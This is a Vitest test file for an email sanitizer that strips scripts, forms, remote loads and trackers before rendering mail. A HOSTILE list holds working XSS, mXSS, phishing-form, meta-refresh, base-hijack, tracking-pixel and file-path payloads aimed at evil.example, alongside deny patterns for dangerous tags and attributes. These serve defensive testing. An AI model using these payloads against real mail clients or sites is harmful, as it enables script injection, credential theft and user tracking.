// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { prepareMail, type PrepareOptions } from './sanitize';

const OPTIONS: PrepareOptions = {
  inlineImages: [],
  remoteImages: null,
  textColor: '#eeeeee',
  linkColor: '#99ccff',
  dark: true,
};
const PIXEL = 'data:image/png;base64,iVBORw0KGgo=';

function prepare(html: string, options: Partial<PrepareOptions> = {}) {
  const result = prepareMail({ contentType: 'html', content: html }, { ...OPTIONS, ...options });
  const document = new DOMParser().parseFromString(result.page, 'text/html');
  return { ...result, document, body: document.body };
}

// Mails written to attack the reader. None of them may leave anything that runs or loads.
const HOSTILE = [
  '<script>alert(1)</script><p>hi</p>',
  '<p onclick="alert(1)" onmouseover="alert(2)">hi</p>',
  '<img src="x" onerror="alert(1)">',
  '<a href="javascript:alert(1)">click</a>',
  '<a href="JaVaScRiPt:alert(1)">click</a>',
  '<a href=" &#14; javascript:alert(1)">click</a>',
  '<a href="vbscript:msgbox(1)">click</a>',
  '<a href="data:text/html,<script>alert(1)</script>">click</a>',
  '<a href="file:///etc/passwd">click</a>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
  '<form action="https://evil.example/steal"><input name="password"><button>Sign in</button></form>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/"><a href="/login">Sign in</a>',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<svg onload="alert(1)"><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<style>@import url("https://evil.example/x.css"); body { background: url(https://evil.example/t) }</style>',
  '<div style="background-image: url(javascript:alert(1))">x</div>',
  '<img src="https://evil.example/t.gif" srcset="https://evil.example/t2.gif 2x">',
  '<img src="//evil.example/t.gif"><img src="http://192.168.1.1/admin?reboot=1">',
  '<table background="https://evil.example/t.gif"><tr><td>x</td></tr></table>',
  '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video><audio src="https://evil.example/a.mp3">',
  '<a href="https://good.example" ping="https://evil.example/ping">x</a>',
  '<details open ontoggle="alert(1)">x</details>',
  '<input autofocus onfocus="alert(1)">',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj4=">',
  '<div id="outlo"><a name="location">x</a></div>',
  '</body></html><script>alert(1)</script>',
  '<template><script>alert(1)</script></template>',
  '<img src="cid:../../etc/passwd">',
];

describe('prepareMail with hostile mail', () => {
  it.each(HOSTILE)('leaves nothing that runs or loads: %s', (html) => {
    const { document, page } = prepare(html);
    const forbidden =
      'script, iframe, frame, object, embed, form, input, button, textarea, select, link, svg, ' +
      'math, video, audio, template, noscript';
    expect(document.querySelectorAll(forbidden)).toHaveLength(0);
    // Only the two tags the app adds itself: the character set and the policy of the frame.
    expect(document.querySelectorAll('meta')).toHaveLength(2);
    expect(document.querySelectorAll('base')).toHaveLength(1);
    expect(document.querySelector('base')?.getAttribute('href')).toBeNull();

    for (const element of document.querySelectorAll('*')) {
      for (const attribute of element.attributes) {
        expect(attribute.name).not.toMatch(/^on/i);
        expect(attribute.name).not.toMatch(
          /^(srcset|ping|action|formaction|background|poster|id|name)$/i,
        );
        if (['href', 'src'].includes(attribute.name)) {
          expect(attribute.value).toMatch(
            /^(https?:|mailto:|data:image\/(png|jpeg|gif|webp|bmp))/i,
          );
        }
      }
    }
    for (const image of document.querySelectorAll('img')) {
      expect(image.getAttribute('src') ?? 'data:').toMatch(/^data:/);
    }
    expect(page).not.toMatch(/<script/i);
  });

  it('puts its own policy first, where a mail cannot get ahead of it', () => {
    const { page } = prepare('<meta http-equiv="Content-Security-Policy" content="default-src *">');
    expect(page.match(/Content-Security-Policy/g)).toHaveLength(1);
    expect(page).toContain(`default-src 'none'; style-src 'unsafe-inline'; img-src data:`);
  });
});

describe('prepareMail with ordinary mail', () => {
  it('keeps formatting, tables and styles', () => {
    const { body, document } = prepare(
      '<html><head><style>.big { font-size: 20px }</style></head><body bgcolor="#eee">' +
        '<h1 class="big">Hi</h1><table width="600"><tr><td style="color: red"><b>Bold</b></td></tr></table>' +
        '</body></html>',
    );
    expect(document.head.innerHTML).toContain('.big { font-size: 20px }');
    expect(body.getAttribute('bgcolor')).toBe('#eee');
    expect(body.querySelector('h1.big')?.textContent).toBe('Hi');
    expect(body.querySelector('td')?.getAttribute('style')).toContain('color: red');
    expect(body.querySelector('b')?.textContent).toBe('Bold');
  });

  it('opens links outside the app and shows where they lead', () => {
    const { body } = prepare(
      '<a href="https://example.com/a?b=1" title="Your bank" target="_self">Your bank</a>' +
        '<a href="mailto:ann@example.com">Mail</a><a href="/relative">Relative</a><a href="#top">Top</a>',
    );
    const [web, mail, relative, anchor] = body.querySelectorAll('a');
    expect(web?.getAttribute('href')).toBe('https://example.com/a?b=1');
    expect(web?.getAttribute('target')).toBe('_blank');
    expect(web?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(web?.getAttribute('title')).toBe('https://example.com/a?b=1');
    expect(mail?.getAttribute('href')).toBe('mailto:ann@example.com');
    expect(relative?.hasAttribute('href')).toBe(false);
    expect(anchor?.hasAttribute('href')).toBe(false);
  });

  it('shows pictures that came with the mail and lists them as used', () => {
    const { body, usedContentIds, remoteImages } = prepare(
      '<img src="cid:logo@x" alt="Logo"><img src="cid:image%20one.png"><img src="cid:unknown">',
      {
        inlineImages: [
          { contentId: 'logo@x', dataUrl: PIXEL },
          { contentId: 'image one.png', dataUrl: PIXEL },
          { contentId: 'never-referenced', dataUrl: PIXEL },
        ],
      },
    );
    const [logo, encoded, unknown] = body.querySelectorAll('img');
    expect(logo?.getAttribute('src')).toBe(PIXEL);
    expect(logo?.getAttribute('alt')).toBe('Logo');
    expect(encoded?.getAttribute('src')).toBe(PIXEL);
    expect(unknown?.hasAttribute('src')).toBe(false);
    expect(usedContentIds).toEqual(['logo@x', 'image one.png']);
    expect(remoteImages).toEqual([]);
  });

  it('leaves out pictures from the internet and reports their addresses', () => {
    const { body, remoteImages } = prepare(
      '<img src="https://news.example.com/a.png?x=1&amp;y=2" width="100"><img src="//cdn.example.com/b.gif">' +
        '<img src="https://news.example.com/a.png?x=1&amp;y=2">',
    );
    expect(remoteImages).toEqual([
      'https://news.example.com/a.png?x=1&y=2',
      'https://cdn.example.com/b.gif',
    ]);
    for (const image of body.querySelectorAll('img')) expect(image.hasAttribute('src')).toBe(false);
    expect(body.querySelector('img')?.getAttribute('width')).toBe('100');
  });

  it('shows pictures from the internet once the user asked for them', () => {
    const address = 'https://news.example.com/a.png';
    const { body, remoteImages } = prepare(
      `<img src="${address}"><img src="https://x.example/failed.png">`,
      {
        remoteImages: { [address]: PIXEL },
      },
    );
    const [shown, failed] = body.querySelectorAll('img');
    expect(shown?.getAttribute('src')).toBe(PIXEL);
    expect(failed?.hasAttribute('src')).toBe(false);
    expect(remoteImages).toEqual(['https://x.example/failed.png']);
  });

  it('keeps small pictures that are written into the mail itself', () => {
    const { body } = prepare(`<img src="${PIXEL}">`);
    expect(body.querySelector('img')?.getAttribute('src')).toBe(PIXEL);
  });

  it('shows mail with its own colours on white, and plain mail in the colours of the app', () => {
    const designed = prepare('<div style="background:#003366;color:#fff">Newsletter</div>');
    expect(designed.page).toContain('background: #ffffff');
    expect(designed.page).toContain('color-scheme: light');

    const simple = prepare('<div>Hello<br>there</div>');
    expect(simple.page).toContain('background: transparent');
    expect(simple.page).toContain('color: #eeeeee');
    expect(simple.page).toContain('color-scheme: dark');
  });
});

describe('prepareMail with plain text', () => {
  const text = (content: string) => {
    const result = prepareMail({ contentType: 'text', content }, OPTIONS);
    return new DOMParser().parseFromString(result.page, 'text/html').body.querySelector('div')!;
  };

  it('keeps line breaks and shows HTML characters as text', () => {
    const body = text('Line one\n\nLine <two> & "three"\n<script>alert(1)</script>');
    expect(body.getAttribute('style')).toContain('pre-wrap');
    expect(body.textContent).toBe('Line one\n\nLine <two> & "three"\n<script>alert(1)</script>');
    expect(body.querySelector('script')).toBeNull();
  });

  it('turns web addresses into links, without the punctuation after them', () => {
    const body = text(
      'See https://example.com/a?b=1&c=2. Or (http://x.example/y), not ftp://z.example',
    );
    const links = [...body.querySelectorAll('a')].map((link) => link.getAttribute('href'));
    expect(links).toEqual(['https://example.com/a?b=1&c=2', 'http://x.example/y']);
    expect(body.textContent).toBe(
      'See https://example.com/a?b=1&c=2. Or (http://x.example/y), not ftp://z.example',
    );
    expect(body.querySelector('a')?.getAttribute('target')).toBe('_blank');
  });
});
